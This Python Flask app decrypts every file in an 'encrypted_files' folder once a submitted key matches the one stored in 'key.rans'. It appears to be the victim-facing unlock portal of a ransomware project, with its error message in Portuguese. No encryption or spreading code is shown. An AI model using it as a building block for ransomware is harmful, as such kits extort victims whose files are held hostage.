import os
from flask import Flask, render_template, request
from cryptography.fernet import Fernet

app = Flask(__name__)

def decrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        content = file.read()
    fernet = Fernet(key)
    decrypt_content = fernet.decrypt(content)
    with open(file_path, "wb") as file:
        file.write(decrypt_content)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/decrypt', methods=['POST'])
def decrypt():
    key = request.form.get('key')
    with open("key.rans", "rb") as key_file:
        correct_key = key_file.read()

    if key == correct_key.decode():
        try:
            for root, dirs, files in os.walk("encrypted_files"):
                for file in files:
                    file_path = os.path.join(root, file)
                    decrypt_file(file_path, correct_key)

            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}
    else:
        return {"success": False, "error": "Chave incorreta."}

if __name__ == '__main__':
    app.run()